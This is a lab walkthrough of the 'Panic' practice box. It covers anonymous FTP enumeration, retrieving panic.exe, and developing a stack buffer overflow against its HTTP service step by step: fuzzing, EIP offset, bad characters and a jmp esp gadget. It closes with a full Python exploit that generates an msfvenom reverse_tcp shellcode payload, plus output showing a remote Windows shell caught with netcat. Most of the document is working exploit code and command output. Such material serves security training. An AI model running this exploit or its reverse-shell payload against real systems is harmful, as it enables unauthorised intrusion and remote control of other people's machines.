# Panic

# Enumeration

## nmap


## 21 - FTP
```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.234.150 
Connected to 192.168.234.150.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.234.150:kali): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 AppData
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Application Data
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Contacts
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Cookies
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Desktop
drwxr-xr-x 1 ftp ftp              0 Jun 21  2021 Documents
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Downloads
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Favorites
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Links
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Local Settings
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Music
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Documents
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 NetHood
---------- 1 ftp ftp         786432 Jun 22  2021 NTUSER.DAT
---------- 1 ftp ftp         131072 Dec 01  2020 ntuser.dat.LOG1
---------- 1 ftp ftp         131072 Dec 01  2020 ntuser.dat.LOG2
---------- 1 ftp ftp          65536 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TM.blf
---------- 1 ftp ftp         524288 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TMContainer00000000000000000001.regtrans-ms
---------- 1 ftp ftp         524288 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TMContainer00000000000000000002.regtrans-ms
---------- 1 ftp ftp             20 Dec 01  2020 ntuser.ini
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Pictures
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 PrintHood
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Recent
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Saved Games
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Searches
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 SendTo
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Start Menu
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Templates
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Videos
226 Successfully transferred "/"
ftp> cd Desktop
250 CWD successful. "/Desktop" is current directory.
ftp> dir
200 Port command successful
150 Opening data channel for directory listing of "/Desktop"
---------- 1 ftp ftp            282 Dec 01  2020 desktop.ini
---------- 1 ftp ftp             34 Jan 23 19:52 local.txt
226 Successfully transferred "/Desktop"
ftp> get local.txt
local: local.txt remote: local.txt
200 Port command successful
550 Permission denied
ftp> cd ../AppData
250 CWD successful. "/AppData" is current directory.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/AppData"
drwxr-xr-x 1 ftp ftp              0 Dec 04  2020 Local
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 LocalLow
drwxr-xr-x 1 ftp ftp              0 Dec 04  2020 Roaming
226 Successfully transferred "/AppData"
ftp> cd Local
250 CWD successful. "/AppData/Local" is current directory.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/AppData/Local"
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Application Data
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 ConnectedDevicesPlatform
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 History
---------- 1 ftp ftp          26176 Jun 21  2021 IconCache.db
drwxr-xr-x 1 ftp ftp              0 Dec 04  2020 Microsoft
drwxr-xr-x 1 ftp ftp              0 Dec 04  2020 Microsoft_Corporation
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Packages
drwxr-xr-x 1 ftp ftp              0 Jan 23 19:55 Temp
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Temporary Internet Files
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 TileDataLayer
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 VirtualStore
226 Successfully transferred "/AppData/Local"
ftp> cd VirtualStore
250 CWD successful. "/AppData/Local/VirtualStore" is current directory.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/AppData/Local/VirtualStore"
226 Successfully transferred "/AppData/Local/VirtualStore"
ftp> cd ..
250 CWD successful. "/AppData/Local" is current directory.
ftp> ls
421 No-transfer-time exceeded. Closing control connection.
ftp> exit
                                                 
```

### panic.exe

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.234.150 
Connected to 192.168.234.150.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.234.150:kali): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> binary
200 Type set to I
ftp> cd Documents
250 CWD successful. "/Documents" is current directory.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/Documents"
-r--r--r-- 1 ftp ftp            402 Dec 01  2020 desktop.ini
-r--r--r-- 1 ftp ftp           1930 Dec 01  2020 EMET GUI.lnk
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Music
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Pictures
drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Videos
-r-xr-xr-x 1 ftp ftp          46636 Dec 01  2020 panic.exe
226 Successfully transferred "/Documents"
ftp> get panic.exe
local: panic.exe remote: panic.exe
200 Port command successful
150 Opening data channel for file download from server of "/Documents/panic.exe"
226 Successfully transferred "/Documents/panic.exe"
46636 bytes received in 0.51 secs (89.3951 kB/s)
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ wine panic.exe                                                                  
[+] WinSock Initialized
Waiting for client connections...
Received a client connection from 127.0.0.1:44662
Bytes received: 9
Received a client connection from 127.0.0.1:46362
Bytes received: 326
Received a client connection from 127.0.0.1:46364
Bytes received: 247

```

### Panic buffer overflow

```
┌──(kali㉿kali)-[~]
└─$ nc localhost 27015 -v     
localhost [127.0.0.1] 27015 (?) open
HTTP 1.0
Huh?

┌──(kali㉿kali)-[~]
└─$ nc localhost 27015 -v                                                                                                                                           1 ⨯
localhost [127.0.0.1] 27015 (?) open
GET / HTTP/1.1
HTTP/1.1 200 OK
Server: Epic/1.0
Content-Length: 67
Content-Type: text/html; charset=utf-8

<html><body>Epic HTTP Server ::  1.0 :: Invulnerable</body></html>
�W�����$��������� e�2��������������{ e�/���$��                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nc localhost 27015 -v
localhost [127.0.0.1] 27015 (?) open
POST / HTTP/1.1   
HTTP/1.1 200 OK
Server: Epic/1.0
Content-Length: 113
Content-Type: text/html; charset=utf-8

<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>
�W�����$��������� ��2��������������{ ��/���$��                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl localhost:27015 --data "a"                                                                                                                       
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ msf-pattern_create -l 1000     
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl localhost:27015 --data "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

```
┌──(kali㉿kali)-[~]
└─$ wine panic.exe   
[+] WinSock Initialized
Waiting for client connections...
Received a client connection from 127.0.0.1:58266
Bytes received: 15
Received a client connection from 127.0.0.1:58438
Bytes received: 16
Received a client connection from 127.0.0.1:60424
Bytes received: 149
Received a client connection from 127.0.0.1:33562
Bytes received: 512
wine: Unhandled page fault on read access to 34614133 at address 34614133 (thread 002e), starting debugger...
002e:err:seh:start_debugger Couldn't start debugger L"winedbg --auto 8 88" (2)
Read the Wine Developers Guide on how to set up winedbg or another debugger


```

# Buffer Overflow Exploitation

I set up the exe in a separate VM

![](Pasted%20image%2020220124131353.png)

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.1.92:27015 -v                                                                                                                                    130 ⨯
*   Trying 192.168.1.92:27015...
* Connected to 192.168.1.92 (192.168.1.92) port 27015 (#0)
> GET / HTTP/1.1
> Host: 192.168.1.92:27015
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Epic/1.0
< Content-Length: 67
< Content-Type: text/html; charset=utf-8
< 
* Excess found in a read: excess = 347, size = 67, maxdownload = 67, bytecount = 0
<html><body>Epic HTTP Server ::  1.0 :: Invulnerable</body></html>
* Closing connection 0
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$     
```

## Finding EIP

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.1.92:27015 --data "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html> 
```

![](Pasted%20image%2020220124131455.png)

```
┌──(kali㉿kali)-[~]
└─$ msf-pattern_offset -l 1000 -q 33614132
[*] Exact match at offset 8
                             
```

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.1.92:27015 --data "AAAAAAAABBBB" 
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>
┌──(kali㉿kali)-[~]
└─$ curl 192.168.1.92:27015 --data "AAAAAAAAAABBBB"
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>
```

![](Pasted%20image%2020220124132517.png)
## Bad Characters


Its just a buffer size to 88x4 = 352 bytes that causes things to be cut off

```
import os


prefix = ""
offset = 9
overflow = "A" * offset
retn = "BBBB" 
#retn = "\x77\x70\x14\x63"[::-1]
padding = "" #"\x90"*10 #+ "\xcc"
payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

### Payload Generation ##############################################
LHOST="192.168.1.92"
LPORT="8888"

#LHOST="192.168.49.234"
#LPORT="443"
#os.system("msfvenom -p windows/shell/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"  EXITFUNC=thread -f py -o msfpayload.py")
#os.system("msfvenom -p windows/exec CMD=calc.exe  EXITFUNC=thread -f py -o msfpayload.py")

#import msfpayload
#payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
#######################################################################

buffer = prefix + overflow + retn + padding + payload + postfix
print(len(buffer))
print(buffer)

import requests
URL = 'http://192.168.1.92:27015'
#URL = 'http://192.168.234.150:27015'

data = buffer
with open("/tmp/payload", "w")  as f:
    f.write(data)
 
os.system('curl '+URL+' --data-binary "@/tmp/payload"')

```

![](Pasted%20image%2020220124153727.png)
![](Pasted%20image%2020220124153847.png)
## Finding Retn Instruction

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Panic]
└─$ ropper -f panic.exe | grep jmp                                                                                                                              1 ⨯ 1 ⚙
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x77701458: add byte ptr [ebx - 0x3c36fb14], al; nop; nop; push ebp; mov ebp, esp; jmp esp; 
0x77702a6d: jmp dword ptr [esi - 0x70]; 
0x77703b94: jmp dword ptr [esi - 0x7d]; 
0x77701463: jmp esp; 
0x77701461: mov ebp, esp; jmp esp; 
0x77701460: push ebp; mov ebp, esp; jmp esp; 
0x7770145f: nop; push ebp; mov ebp, esp; jmp esp; 
0x7770145e: nop; nop; push ebp; mov ebp, esp; jmp esp; 
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Panic]
└─$  
```

## Final Exploit Test

```
import os


prefix = ""
offset = 9
overflow = "A" * offset
retn = "\x77\x70\x14\x63"[::-1]
padding = "\x90"*10 #+ "\xcc"
postfix = ""

### Payload Generation ##############################################
LHOST="192.168.1.92"
LPORT="8888"

#LHOST="192.168.49.234"
#LPORT="443"
command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
os.system(command)
import msfpayload
payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
#######################################################################

buffer = prefix + overflow + retn + padding + payload + postfix
print(len(buffer))
print([buffer])
data = buffer


URL = 'http://192.168.1.92:27015'
#URL = 'http://192.168.234.150:27015'
with open("/tmp/payload", "w")  as f:
    f.write(data)
os.system('curl '+URL+' --data-binary "@/tmp/payload"')


'''
```

```
                                                                                                                 
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Panic]
└─$ python exploit.py                                                                                                                                               1 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=55, char=0x78)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1700 bytes
Saved as: msfpayload.py
371
['AAAAAAAAAc\x14pw\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0^\x81v\x0e\xdd\x1a\xae\x1d\x83\xee\xfc\xe2\xf4!\xf2,\x1d\xdd\x1a\xce\x948+nyVJ\x9e\x96\x8f\x16%O\xc9\x91\xdc5\xd2\xad\xe4;\xec\xe5\x02!\xbcf\xac1\xfd\xdba\x10\xdc\xddL\xef\x8fM%O\xcd\x91\xe4!VV\xbfe>R\xaf\xcc\x8c\x91\xf7=\xdc\xc9%T\xc5\xf9\x94TV.%\x1c\x0b+Q\xb1\x1c\xd5\xa3\x1c\x1a"Nh+\x19\xd3\xe5\xe6g\x8ah9B%E\xf9\x1b}{V\x16\xe5\x96\x85\x06\xaf\xceV\x1e%\x1c\r\x93\xea9\xf9A\xf5|\x84@\xff\xe2=E\xf1GV\x08E\x90\x80r\x9d/\xdd\x1a\xc6j\xae(\xf1I\xb5V\xd9;\xda\xe5{\xa5M\x1b\xae\x1d\xf4\xde\xfaM\xb53.v\xdd\xe5{M\x8dJ\xfe]\x8dZ\xfeu7\x15q\xfd"\xcf9w\xd8rn\xb5\xdcF\xc6\x1f\xdd8\x16\x94;p\xbeK\x8ar7\xb8\xa9{Q\xc8X\xda\xda\x11"T\xa6h1r^\xa8\x7fLQ\xc8\xb5y\xc3y\xdd\x93MJ\x8aM\x9f\xeb\xb7\x08\xf7K?\xe7\xc8\xda\x99>\x92\x1c\xdc\x97\xea9\xcd\xdc\xaeY\x89J\xf8K\x8b\\\xf8S\x8bL\xfdK\xb5cb"[\xe5{\x94=T\xf8["*\xc6\x15Z\x07\xce\xe2\x08\xa1N\x00\xf7\x10\xc6\xbbH\xa73\xe2\x08&\xa8a\xd7\x9aU\xfd\xa8\x1f\x15Z\xceh\xc1w\xddIQ\xc8']
<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Panic]
└─$    
```

```
(base) [hacker@hackerbook ~]$ nc -nlvp 8888 
Connection from 192.168.1.92:47120
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\hacker\Downloads>

```

This is a weird box, my machine sometimes runs the exploit and sometimes doesn't

On goggling realised it is EMET stuff

https://samsclass.info/127/proj/vs-EMET.htm


# Privesc


# Others